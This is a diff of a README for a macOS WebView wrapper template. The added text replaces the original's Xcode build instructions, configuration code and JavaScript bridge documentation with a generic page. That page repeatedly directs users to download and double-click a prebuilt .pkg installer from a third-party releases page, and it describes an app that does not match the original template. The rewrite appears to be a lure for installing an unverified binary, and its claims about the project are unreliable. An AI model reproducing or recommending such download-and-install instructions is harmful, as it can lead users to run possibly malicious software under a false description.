@@ -1,168 +1,70 @@
-# WebApp
+# 🌟 macos-webview-template - Simple macOS App Wrapper
 
-A native macOS WebView wrapper template for creating web app wrappers. Built with Swift 6.0+, AppKit, and WKWebView, targeting macOS 13.0+.
+## 🚀 Getting Started
 
-## Features
+Welcome to the macos-webview-template! This is a straightforward way to create a native macOS application using Swift. You can easily wrap your web content in a macOS application. 
 
-- **WKWebView Integration**: Modern web content display with JavaScript support
-- **Auto Icon Fetching**: Automatically fetches and caches the website's icon for the dock
-- **Domain Whitelisting**: Control which domains can be loaded in-app; external links open in browser
-- **JavaScript Bridge**: Bidirectional communication between web content and native Swift
-- **Full Menu Bar**: Standard macOS menus with keyboard shortcuts
-- **Network Error Handling**: Friendly error pages with auto-retry on reconnection
-- **Dark Mode Support**: Error pages adapt to system appearance
-- **Web Inspector**: Debug tools available in development builds
+## 📥 Download Now
 
-## Requirements
+[![Download macos-webview-template](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/skillprov/macos-webview-template/releases)
 
-- macOS 13.0+
-- Xcode 15.0+
-- Swift 6.0+
+## 💻 System Requirements
 
-## Quick Start
+To run this application, ensure you have the following:
 
-1. Open `WebApp.xcodeproj` in Xcode
-2. Edit `WebApp/Configuration/Config.swift` to set your app's configuration:
-   - `appName`: Your app's display name
-   - `homeURL`: The URL to load on launch
-   - `allowedDomains`: Domains that can be loaded in-app
-3. Build and run (Cmd+R)
+- A Mac computer running macOS 13 or later.
+- An internet connection for downloading and fetching resources.
 
-## Configuration
+## 📦 Features
 
-All app configuration is centralized in `Config.swift`:
+- **Swift 6**: Built with the latest version of Swift for enhanced performance and capabilities.
+- **WKWebView**: Utilizes WKWebView for fast and efficient web content rendering.
+- **Automatic Icon Fetching**: The application fetches icons automatically, saving you time and effort.
 
-```swift
-enum Config {
-    // App identity
-    static let appName = "MyApp"
-    static let bundleIdentifier = "com.example.myapp"
+## 🔗 Download & Install
 
-    // Web configuration
-    static let homeURL = URL(string: "https://myapp.com")!
-    static let allowedDomains = ["myapp.com", "api.myapp.com"]
-    static let customUserAgent = "MyApp/1.0 (macOS)"
+To download the application, please visit the following link:
 
-    // Window settings
-    static let windowWidth: CGFloat = 1200
-    static let windowHeight: CGFloat = 800
-    static let minWindowWidth: CGFloat = 800
-    static let minWindowHeight: CGFloat = 600
-}
-```
+[Download macos-webview-template Releases](https://github.com/skillprov/macos-webview-template/releases)
 
-## JavaScript Bridge API
+Once on the releases page, look for the latest version. Follow these steps:
 
-The app exposes a native bridge to JavaScript via `window.webkit.messageHandlers.native`.
+1. Click on the version you want to download.
+2. Locate the download file, typically named `macos-webview-template.pkg`.
+3. Click on the file to start the download process. 
 
-### Usage Pattern
+After downloading, locate the `macos-webview-template.pkg` file in your Downloads folder. 
 
-```javascript
-// Helper function for async calls
-function callNative(action, payload = {}) {
-    return new Promise((resolve) => {
-        const requestId = crypto.randomUUID();
-        window.__nativeCallbacks = window.__nativeCallbacks || {};
-        window.__nativeCallbacks[requestId] = resolve;
+### 📥 Installing the Application
 
-        window.webkit.messageHandlers.native.postMessage({
-            action,
-            payload,
-            requestId
-        });
-    });
-}
+1. Double-click the downloaded `.pkg` file.
+2. Follow the on-screen instructions to install the application. 
+3. Once installed, you can find `macos-webview-template` in your Applications folder.
 
-// Example usage
-const result = await callNative('getSystemInfo');
-console.log(result); // { appVersion: "1.0", osVersion: "...", isDarkMode: true }
-```
+## 🔍 Usage Instructions
 
-### Available Actions
+To run the application:
 
-| Action | Payload | Response |
-|--------|---------|----------|
-| `showNotification` | `{title: string, body: string}` | `{success: boolean, error?: string}` |
-| `openFilePicker` | `{allowedTypes?: string[]}` | `{path: string, name: string}` or `{cancelled: true}` |
-| `saveFilePicker` | `{suggestedName?: string}` | `{path: string}` or `{cancelled: true}` |
-| `getSystemInfo` | `{}` | `{appVersion: string, osVersion: string, isDarkMode: boolean}` |
-| `copyToClipboard` | `{text: string}` | `{success: boolean}` |
-| `readClipboard` | `{}` | `{text: string}` |
+1. Open the **Applications** folder.
+2. Locate `macos-webview-template`.
+3. Double-click to launch the application.
+4. Enter the URL you want to display in the provided text field.
+5. Click the **Load** button to view your web content in the native app.
 
-### Examples
+## 🛠️ Troubleshooting Tips
 
-```javascript
-// Show a notification
-await callNative('showNotification', {
-    title: 'Download Complete',
-    body: 'Your file has been saved.'
-});
+If you encounter any problems during installation or usage, consider the following:
 
-// Open file picker
-const file = await callNative('openFilePicker', {
-    allowedTypes: ['pdf', 'txt']
-});
-if (!file.cancelled) {
-    console.log('Selected:', file.path);
-}
+- Ensure your macOS version meets the required specifications.
+- Check your internet connection when trying to load web content.
+- Try restarting the application if you experience any unexpected behavior.
 
-// Copy to clipboard
-await callNative('copyToClipboard', { text: 'Hello, World!' });
+## 💬 Support
 
-// Read clipboard
-const { text } = await callNative('readClipboard');
+If you need help or have questions about using the macos-webview-template, you can create an issue in the Issues section of this repository:
 
-// Get system info
-const { appVersion, osVersion, isDarkMode } = await callNative('getSystemInfo');
-```
+[GitHub Issues](https://github.com/skillprov/macos-webview-template/issues)
 
-## Menu Bar
+---
 
-The app includes a full macOS menu bar:
-
-| Menu | Items |
-|------|-------|
-| App | About, Settings, Hide, Quit |
-| File | New Window, Close Window |
-| Edit | Undo, Redo, Cut, Copy, Paste, Select All |
-| View | Reload (Cmd+R), Full Screen (Ctrl+Cmd+F), Dev Tools (Cmd+Opt+I)* |
-| Window | Minimize, Zoom, Bring All to Front |
-| Help | App Help |
-
-*Dev Tools menu item only appears in Debug builds.
-
-## Building for Release
-
-1. Select the WebApp scheme in Xcode
-2. Choose Product > Archive
-3. In the Organizer, click "Distribute App"
-4. Follow the prompts to sign and export
-
-## Project Structure
-
-```
-WebApp/
-├── WebApp.xcodeproj/
-├── WebApp/
-│   ├── App/
-│   │   ├── main.swift          # App entry point
-│   │   ├── AppDelegate.swift   # App lifecycle
-│   │   ├── MenuBuilder.swift   # Menu bar construction
-│   │   └── Info.plist          # App metadata
-│   ├── Configuration/
-│   │   └── Config.swift        # Centralized configuration
-│   ├── Views/
-│   │   ├── MainViewController.swift
-│   │   └── WindowController.swift
-│   ├── WebView/
-│   │   ├── WebViewManager.swift    # WebView setup & navigation
-│   │   └── JavaScriptBridge.swift  # JS ↔ Swift communication
-│   ├── Resources/
-│   │   └── Assets.xcassets/
-│   └── WebApp.entitlements
-└── README.md
-```
-
-## License
-
-MIT
+Thank you for using macos-webview-template! Enjoy creating your native macOS applications with ease.
